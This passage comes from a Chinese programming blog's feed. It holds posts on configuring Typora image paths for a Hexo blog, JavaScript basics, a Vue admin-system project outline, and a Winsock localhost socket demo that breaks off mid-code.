        <content type="html"><![CDATA[<h2 id="Typora大法之乾坤大挪移"><a href="#Typora大法之乾坤大挪移" class="headerlink" title="Typora大法之乾坤大挪移"></a>Typora大法之乾坤大挪移</h2><p>因为我的博客是基于hexo搭建的，所以写博客用的文件都为.md的格式。起初写博客用的软件是Notepad++，因为是看CodeSheep的视频入门的，羊哥推荐的软件就是Notepad++，所以我就从21年一月初一直用到五月中旬。说句实话，在写博客的时候最让我头痛的事情就是导入图片这一块。比如要进行效果演示，在Notepad++的编辑器中书写格式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">![](/images/Javascript/xxx.png/jpg)<br></code></pre></td></tr></table></figure><p>格式看起来很简洁，写起来好像没什么困难的，的确如此。但是当我需要进行大量的效果演示的时候，这简洁代码背后隐藏的是大量的截图、保存截图的工作。一开始我只会用qq的【Ctrl+Alt+A】进行截图，截图过后还要手动保存在本地，手动调配文件保存路径，这就让我非常苦恼。好在现在没有了这种苦恼，因为我发现了Windows10自带的截图快捷键【Shift+Win+S】搭配上Typora会产生极其简单的导入图片操作。</p><p>不卖关子了，直接上干货。</p><h3 id="你必须要用相对路径写博客"><a href="#你必须要用相对路径写博客" class="headerlink" title="你必须要用相对路径写博客"></a>你必须要用相对路径写博客</h3><p>在上干货之前，还是要卖一点点小关子滴，嘿嘿！</p><p>首先，我们要知道相对路径是什么，以及如何使用相对路径来写博客。</p><blockquote><p>相对路径就是指由这个文件所在的路径引起的跟其它文件（或文件夹）的路径关系。使用相对路径可以为我们带来非常多的便利。HTML<a href="https://baike.baidu.com/item/%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84/481185">绝对路径</a>(absolute path)指带域名的文件的完整路径。</p></blockquote><p>以上是百度百科对于相对路径的定义。为了更好的让大家理解什么是相对路径以及掌握使用相对路径的方法，请认真看如下图片</p><p><img src="/images/JavaScript/image-20210522213807326.png"></p><p>红框框中圈出的是绝对路径，它代表在电脑文件系统中的绝对位置。而相对路径是这样表示的：</p><p><img src="/images/JavaScript/image-20210522213955162.png"></p><p><strong>蓝线上方所示的就是相对路径。可以看出，相对路径对比于绝对路径少了前面的一部分。如上的相对路径中，../所代表的意思是，.md（就是本文的博客文件）文件所在的文件夹的上级文件夹的位置。所以../images代表的就是与.md文件所在的文件夹同级的文件夹images。如此一来，寻找文件依赖的就是此文件的上级文件夹，而并非绝对的文件路径。</strong>对我来说，相对路径使用最频繁的地方就在于写博客。因为博客要远端部署在github上，而部署在github上的博客文件中多多少少都会有图片引用，如果要引用图片那必须要指出图片所在的文件目录。文件目录必须要用相对路径来写，否则会产生灾难性的后果= =。</p><p>举个例子，我有一张图片存在D：/github/blog/source/images/中。我的博客文件的路径是D：/github/blog/source/posts/。如果我想在博客中用绝对路径引入这张图片，那必须要从D：/开始写（C：/也可以，看文件放在哪个盘），而部署在远端的文件中，并没有D：/这个目录，所以图片就GG了。但是要用相对路径的话，那就美滋滋啦。我直接写../images/xx.jpg就可以了（图片文件是.jpg格式的），具体原理在上面的粗体部分已经很详细的说过。</p><h3 id="超级干货来了"><a href="#超级干货来了" class="headerlink" title="超级干货来了"></a>超级干货来了</h3><p>在掌握了前面的知识后，你将会看到一场精彩绝伦的乾坤大挪移！</p><p><img src="/images/JavaScript/image-20210522220818365.png"></p><ol><li>打开偏好设置</li></ol><p><img src="/images/JavaScript/image-20210522220931268.png"></p><ol start="2"><li><p>选择图像</p></li><li><p>填写相对路径</p><ul><li>举个例子，我有一张图片存在D：/github/blog/source/images/Javascript中。我写的这篇博客文件的路径是D：/github/blog/source/posts/。那么我要填写的相对路径就如图所示。</li></ul></li><li><p>利用Windows10自带的截图工具，快捷键【Shift+Win+S】截图</p></li><li><p>按Ctrl+V在Typora中直接粘贴（就这一点，是Typora最牛b的地方）</p></li><li><p>如果只是把Typora当作本地的笔记用，就不需要进行下一步了。如果是想把博客推送到远端，那么必须要进行第七步的操作。</p></li><li><p>点击引入的图片，做一些修改。如下图把橙色部分的文字都删掉，然后删掉..。</p><p><img src="/images/JavaScript/image-20210522221907769.png"></p></li></ol><p>把它变成：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">![](/)<br></code></pre></td></tr></table></figure><p>这种形式。</p><p><strong>完成了上面的操作，之后再进行图片的引入，只需要重复4、5、6、7步骤就好了，极其方便！</strong></p><h3 id="一些解释"><a href="#一些解释" class="headerlink" title="一些解释"></a>一些解释</h3><p>很多同学可能会对删除..有困惑，在给出的例子中，明明images在.md文件的上级，为什么要删掉..呢？</p><p><img src="/images/JavaScript/image-20210522224316025.png"></p><p>如上图所示，在我把文件推送到远端之后，文件的排布如上。这里我们要转变一下思想，本地端的相对地址同服务器端的相对地址是不一样的。本地端的相对地址是以本文件所在的位置为核心，例如../images，在本地端代表的意思是.md上级文件夹中的images文件的位置。他是从.md出发的。然而在服务器端，我们写的相对地址其实是在补充，他是从服务器端的ip地址开始的，如下图红色标注的部分</p><p><img src="/images/JavaScript/image-20210522225126179.png"></p><p>补充的是橙色标注部分后面的内容。</p><p><img src="/images/JavaScript/image-20210522225335173.png"></p><p>如上图所示，可以看到当路径补充完整后，其格式同我们上面的相对路径相同。</p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> 小妙招 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>玩转JavaScript(一)</title>
      <link href="/2021/05/22/%E7%8E%A9%E8%BD%ACJavaScript-%E4%B8%80/"/>
      <url>/2021/05/22/%E7%8E%A9%E8%BD%ACJavaScript-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="初探JavaScript"><a href="#初探JavaScript" class="headerlink" title="初探JavaScript"></a>初探JavaScript</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>昨夜山河齐恸震，今朝大星辞九州。在写这篇博客的时候，袁老逝世了。在神农离去的两分钟后，吴孟超先生也离开了人世。两位巨人的远去，让我不禁感慨，我们无法抵抗浪潮，但会永远铭记灯塔。</p><h3 id="前端知识体系都有什么东东？"><a href="#前端知识体系都有什么东东？" class="headerlink" title="前端知识体系都有什么东东？"></a>前端知识体系都有什么东东？</h3><ol><li><p><strong>HTML：超文本标记语言（Hyper Text Markup Language），决定网页的结构和内容。</strong></p></li><li><p><strong>CSS：层叠样式表（Cascading Style Sheets），设定网页的表现形式。</strong></p><ul><li>CSS预处理器：CSS预处理器定义了一种新的语言，其基本思想是，用一种专门的编程语言，为CSS增加一些编程的特性，将CSS作为目标生成文件，然后开发者就只要使用这种语言进行CSS的编码工作。转化成通俗易懂的话来讲就是，<strong>“用一种专门的编程语言，进行Web页面样式设计，再通过编译器转化成为正常的CSS文件，以供项目使用”。</strong></li></ul></li><li><p><strong>JavaScript：是一种弱类型脚本语言，其源代码不需要经过编译，而是由浏览器解释运行，用于控制网页的行为。</strong></p></li><li><p><strong>JavaScript框架</strong>：</p><ul><li>jQuery：优点是简化了DOM操作，缺点是DOM操作太频繁，影响前端性能；在前端眼里使用它仅仅是为了兼容IE6\7\8；</li><li>Angular：Google收购的前端框架，由一群Java程序员开发，其特点是将后台的MVC模式搬到了前端并增加了模块化开发的理念，与微软合作，采用TypeScript语法开发；对后台程序员友好，对前端程序员不太友好；最大的缺点是版本迭代不合理（如1代-&gt;2代，除了名字，基本就是两个东西）</li><li>React：Facebook出品，一款高性能的JS前端框架；特点是提出了新概念【虚拟DOM】用于减少真实DOM操作，在内存中模拟DOM操作，有效提升了前端渲染效率；缺点是复杂，因为需要额外学习一门【JSX】语言；</li><li>Vue：一款渐进式JavaScript框架，所谓渐进式就是逐步实现新特性的意思，如实现模块化开发、路由、状态管理等新特性。其特点是综合了Angular（模块化）和React（虚拟DOM）的优点；</li><li>Axios：前端通信框架；因为Vue的边界很明确，就是为了处理DOM，所以并不具备通信能力，此时就需要额外使用一个通信框架与服务器交互；当然也可以直接选择使用jQuery提供的AJAX通信功能；</li></ul></li><li><p><strong>UI框架：</strong></p><ul><li>Ant-Design:阿里巴巴出品，基于React的UI框架；</li><li>ElementUI、iview、ice：饿了么出品，基于Vue的UI框架；</li><li>Bootstrap：Twitter推出的一个用于前端开发的开源工具包；</li><li>AmazeUI:又叫“妹子UI”，一款HTML5跨屏前端框架；</li></ul></li><li><p><strong>JavaScript构建工具：</strong></p><ul><li>Babel：JS编译工具，主要用于浏览器不支持的ES新特性，比如用于编译TypeScript；</li><li>WebPack：模块打包器，主要作用是打包、压缩、合并及按序加载；</li></ul></li></ol><h3 id="三端统一"><a href="#三端统一" class="headerlink" title="三端统一"></a>三端统一</h3><ol><li><p>混合开发（Hybrid App）：主要目的是实现一套代码三端统一（PC\Android:.apk\IOS:.ipa）并能够调用到设备底层硬件（如传感器、GPS、摄像头等），打包方式有如下两种：</p><ul><li>云打包：HBuild-&gt;HBuildX，DCloud出品；API Cloud；</li><li>本地打包：Cordova（前身是PhoneGap）；</li></ul></li><li><p>微信小程序：详见微信官网，这里就额是介绍一个方便微信小程序UI的框架：WeUI；</p></li></ol><h3 id="后端技术"><a href="#后端技术" class="headerlink" title="后端技术"></a>后端技术</h3><p>前端人员为了方便开发也需要掌握一定的后端技术，但我们Jaca后台人员知道后台体系极其庞大复杂，所以为了方便前端人员开发后台应用，就出现了Node.js这样的技术。</p><p>NodeJS的作者已经声称放弃了NodeJS（说是架构做的不好再加上笨重的node_modules，可能让作者不爽了吧），开始开发全新的架构Deno。</p><p>既然是后台技术，那肯定也需要框架和项目管理工具，NodeJS框架及项目管理工具如下：</p><ul><li>Express:NodeJS框架</li><li>Koa：Express简化版</li><li>NPM：项目综合管理工具，类似于Maven</li><li>YARN：NPM的代替方案，类似于Maven和Gradle的关系</li></ul><h2 id="什么是-JavaScript？"><a href="#什么是-JavaScript？" class="headerlink" title="什么是 JavaScript？"></a>什么是 JavaScript？</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><p>JavaScript是一门世界上最流行的脚本语言</p><p>然而Java和JavaScript鸡毛关系没有，JavaScript名字看起来带Java，实际上是在蹭Java的热度。</p><p><strong>一个合格的后端人员，必须要精通JavaScript</strong></p><h3 id="2-历史"><a href="#2-历史" class="headerlink" title="2.历史"></a>2.历史</h3><p>ECMAScript它可以理解为是JavaScript的一个标准，最新版本已经到了es6版本，但是大部分浏览器还只停留在支持es5代码上！</p><p>问题所在：开发环境–线下环境 不一致</p><h2 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h2><h3 id="1-引入到HTML中"><a href="#1-引入到HTML中" class="headerlink" title="1.引入到HTML中"></a>1.引入到HTML中</h3><p>lesson1.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">alert(<span class="hljs-string">&#x27;你好啊，中国男孩！&#x27;</span>);<br></code></pre></td></tr></table></figure><p>lesson1.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--Script标签内写JavaScript代码--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/lesson1.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-comment">&lt;!--javascript标签必须成对出现--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>效果：</p><p><img src="/images/JavaScript/image-20210522211240056.png"></p><h3 id="2-基本语法与数据类型"><a href="#2-基本语法与数据类型" class="headerlink" title="2.基本语法与数据类型"></a>2.基本语法与数据类型</h3><p>JavaScript的基本语法同Java并无太大的差别，我们主要来看定义变量的方式。</p><p>lesson2.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> num = <span class="hljs-number">1</span>;<br>alert(num);<br></code></pre></td></tr></table></figure><p>lesson2.html</p><p>同lesson1.html相同</p><p>效果：</p><p><img src="/images/JavaScript/image-20210523010033417.png"></p><p>JavaScript中变量定义的方法很爽，无需指明变量的类型，直接赋值就好。它其实就像python中变量定义的方法，只不过前面要加一个var。</p><h3 id="number"><a href="#number" class="headerlink" title="number"></a>number</h3><p>JavaScript不区分整数和小数，只有一个类型number。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-number">123</span><span class="hljs-comment">//整数123</span><br><span class="hljs-number">123.1</span><span class="hljs-comment">//浮点数123.1</span><br><span class="hljs-number">1.123e3</span><span class="hljs-comment">//科学计数法</span><br>-<span class="hljs-number">99</span><span class="hljs-comment">//复数</span><br><span class="hljs-literal">NaN</span><span class="hljs-comment">//not a number</span><br><span class="hljs-literal">Infinity</span><span class="hljs-comment">//表示无穷大</span><br></code></pre></td></tr></table></figure><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>‘abc’ ， “abc”</p><h3 id="布尔值"><a href="#布尔值" class="headerlink" title="布尔值"></a>布尔值</h3><p>true，false</p><h3 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&amp;&amp; <span class="hljs-comment">//两个都为真，结果为真</span><br><br>|| <span class="hljs-comment">//一个为真，结果为真</span><br>  <br>! <span class="hljs-comment">// 真即假，假为真</span><br></code></pre></td></tr></table></figure><h3 id="比较运算符（重要）"><a href="#比较运算符（重要）" class="headerlink" title="比较运算符（重要）"></a>比较运算符（重要）</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">= <span class="hljs-comment">//赋值</span><br>== <span class="hljs-comment">//等于（类型不一样，值一样，也会判断为true）</span><br>=== <span class="hljs-comment">// 绝对等于（类型一样，值一样，结果为true）</span><br></code></pre></td></tr></table></figure><p><strong>坚持不要使用==进行比较</strong></p><p>须知：</p><ul><li><p>NaN===NaN，这个与所有的数值都不相等，包括自己</p></li><li><p>只能通过isNaN(NaN)来判断这个数是否是NaN</p></li></ul><h3 id="浮点数问题"><a href="#浮点数问题" class="headerlink" title="浮点数问题"></a>浮点数问题</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">console</span>.log((<span class="hljs-number">1</span>/<span class="hljs-number">3</span>)===(<span class="hljs-number">1</span>-<span class="hljs-number">2</span>/<span class="hljs-number">3</span>)) <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p>尽量避免使用浮点数进行运算，存在精度问题。</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">console.log(Math.abs(1/3-(1-2/3))&lt;0.00000001)// true<br></code></pre></td></tr></table></figure><h3 id="null和undefined"><a href="#null和undefined" class="headerlink" title="null和undefined"></a>null和undefined</h3><ul><li>null 空</li><li>undefined 未定义</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">console</span>.log(a) <span class="hljs-comment">// undefined</span><br></code></pre></td></tr></table></figure><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>定义数组的两种方式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-number">1.</span><span class="hljs-keyword">var</span> arr = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">null</span>]<br></code></pre></td></tr></table></figure><ul><li>Java的数组内必须是相同的数据类型，JavaScript不必。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-number">2.</span><span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">null</span>)<br></code></pre></td></tr></table></figure><ul><li>为了保证代码的可读性，定义数组尽量使用第一种方式。</li></ul><p>如果取数组下标，越界了的话，就会==undefined==。</p><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>对象是大括号，数组是中括号。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> Person = &#123;<br>    name:<span class="hljs-string">&quot;yaning&quot;</span>,<br>    age:<span class="hljs-number">20</span>,<br>    tags:[<span class="hljs-string">&#x27;js&#x27;</span>,<span class="hljs-string">&#x27;java&#x27;</span>,<span class="hljs-string">&#x27;web&#x27;</span>]<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>每个属性之间通过逗号隔开，最后一个不需要添加逗号。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">Person.name <span class="hljs-comment">// &quot;yaning&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210523204607542.png"></p>]]></content>
      
      
      <categories>
          
          <category> 脚本语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web开发 </tag>
            
            <tag> Java Web </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue项目实战-电商管理系统</title>
      <link href="/2021/05/21/Vue%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98-%E7%94%B5%E5%95%86%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
      <url>/2021/05/21/Vue%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98-%E7%94%B5%E5%95%86%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="0-项目概述"><a href="#0-项目概述" class="headerlink" title="0.项目概述"></a>0.项目概述</h2><h3 id="电商后台管理系统的功能"><a href="#电商后台管理系统的功能" class="headerlink" title="电商后台管理系统的功能"></a>电商后台管理系统的功能</h3><p>电商后台管理系统用于管理用户账号、商品分类、商品信息、订单、数据统计等业务功能。<br><img src="/images/web%E9%A1%B9%E7%9B%AE%E6%A6%82%E8%BF%B0.png"></p><h3 id="电商后台管理系统的开发模式（前后端分离）"><a href="#电商后台管理系统的开发模式（前后端分离）" class="headerlink" title="电商后台管理系统的开发模式（前后端分离）"></a>电商后台管理系统的开发模式（前后端分离）</h3><p>电商后台管理系统采用前后端分离的开发模式，其中前端项目是基于Vue技术栈的SPA项目。<br><img src="/images/Vue%E5%AE%9E%E6%88%98/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%BC%80%E5%8F%91%E6%A8%A1%E5%BC%8F.png"></p><h3 id="电商后台管理系统的技术选型"><a href="#电商后台管理系统的技术选型" class="headerlink" title="电商后台管理系统的技术选型"></a>电商后台管理系统的技术选型</h3><h4 id="前端项目技术栈"><a href="#前端项目技术栈" class="headerlink" title="前端项目技术栈"></a>前端项目技术栈</h4><ul><li>Vue</li><li>Vue-router</li><li>Element-UI</li><li>Axios</li><li>Echarts</li></ul><h4 id="后端项目技术栈"><a href="#后端项目技术栈" class="headerlink" title="后端项目技术栈"></a>后端项目技术栈</h4><ul><li>Node.js</li><li>Express</li><li>Jwt(状态保持工具,模拟Session)</li><li>Mysql(后台数据库)</li><li>Sequelize(操作数据库的框架)</li></ul><h2 id="1-项目初始化"><a href="#1-项目初始化" class="headerlink" title="1.项目初始化"></a>1.项目初始化</h2><h3 id="前端项目初始化步骤"><a href="#前端项目初始化步骤" class="headerlink" title="前端项目初始化步骤"></a>前端项目初始化步骤</h3><ol><li>安装Vue脚手架</li><li>通过Vue脚手架创建项目</li><li>配置Vue路由</li><li>配置Element-UI组件库</li><li>配置axios远程仓库</li><li>初始化git远程仓库</li><li>将本地项目托管到Github中</li></ol>]]></content>
      
      
      <categories>
          
          <category> 项目实战 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web开发 </tag>
            
            <tag> 框架 </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>玩转socket（六）</title>
      <link href="/2021/05/05/%E7%8E%A9%E8%BD%ACsocket%EF%BC%88%E5%85%AD%EF%BC%89/"/>
      <url>/2021/05/05/%E7%8E%A9%E8%BD%ACsocket%EF%BC%88%E5%85%AD%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="Windows下的Socket演示程序"><a href="#Windows下的Socket演示程序" class="headerlink" title="Windows下的Socket演示程序"></a>Windows下的Socket演示程序</h2><p>上节演示了Linux下的socket程序，这节来看一下Windows下的socket程序。同样，server.cpp为服务端代码，client为客户端代码。</p><p><strong>服务端代码 server.cpp：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;winsock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;ws2_32.lib&quot;</span>) <span class="hljs-comment">//加载 ws2_32.dll</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-comment">//初始化DLL</span><br>WSADATA wsaData;<br>WSAStartup(MAKEWORD(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>),&amp;wsaData);<br><br><span class="hljs-comment">//创建套接字</span><br>SOCKET servSock = socket(PF_INET,SOCK_STREAM,IPPROTO_TCP);<br><br><span class="hljs-comment">//绑定套接字</span><br>sockaddr_in sockAddr;<br><span class="hljs-built_in">memset</span>(&amp;sockAddr,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(sockAddr));<span class="hljs-comment">//每个字节都用0填充</span><br>sockAddr.sin_family = PF_INET;<span class="hljs-comment">//使用IPv4地址</span><br>sockAddr.sin_addr.s_addr = inet_addr(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<span class="hljs-comment">//使用具体的IP地址</span><br>sockAddr.sin_port = htons(<span class="hljs-number">1234</span>);<span class="hljs-comment">//端口</span><br>bind(servSock,(SOCKADDR*)&amp;sockAddr,<span class="hljs-keyword">sizeof</span>(SOCKADDR));<br><br><span class="hljs-comment">//进入监听状态</span><br>listen(servSock,<span class="hljs-number">20</span>);<br><br><span class="hljs-comment">//接收客户端请求</span><br>SOCKADDR clntAddr;<br><span class="hljs-keyword">int</span> nSize = <span class="hljs-keyword">sizeof</span>(SOCKADDR);<br>SOCKET clntSock = accept(servSock,(SOCKADDR*)&amp;clntAddr,&amp;nSize);<br><br><span class="hljs-comment">//向客户端发送数据</span><br><span class="hljs-keyword">char</span> *str = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>send(clntSock,str,<span class="hljs-built_in">strlen</span>(str)+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>),<span class="hljs-literal">NULL</span>);<br><br><span class="hljs-comment">//关闭套接字</span><br>closesocket(clntSock);<br>closesocket(servSock);<br><br><span class="hljs-comment">//终止DLL的使用</span><br>WSACleanup();<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>客户端代码client.cpp：</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;WinSock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;ws2_32.lib&quot;</span>)  <span class="hljs-comment">//加载 ws2_32.dll</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//初始化DLL</span><br>    WSADATA wsaData;<br>    WSAStartup(MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsaData);<br><br>    <span class="hljs-comment">//创建套接字</span><br>    SOCKET sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);<br><br>    <span class="hljs-comment">//向服务器发起请求</span><br>    sockaddr_in sockAddr;<br>    <span class="hljs-built_in">memset</span>(&amp;sockAddr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(sockAddr));  <span class="hljs-comment">//每个字节都用0填充</span><br>    sockAddr.sin_family = PF_INET;<br>    sockAddr.sin_addr.s_addr = inet_addr(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<br>    sockAddr.sin_port = htons(<span class="hljs-number">1234</span>);<br>    connect(sock, (SOCKADDR*)&amp;sockAddr, <span class="hljs-keyword">sizeof</span>(SOCKADDR));<br><br>    <span class="hljs-comment">//接收服务器传回的数据</span><br>    <span class="hljs-keyword">char</span> szBuffer[MAXBYTE] = &#123;<span class="hljs-number">0</span>&#125;;<br>    recv(sock, szBuffer, MAXBYTE, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">//输出接收到的数据</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Message form server: %s\n&quot;</span>, 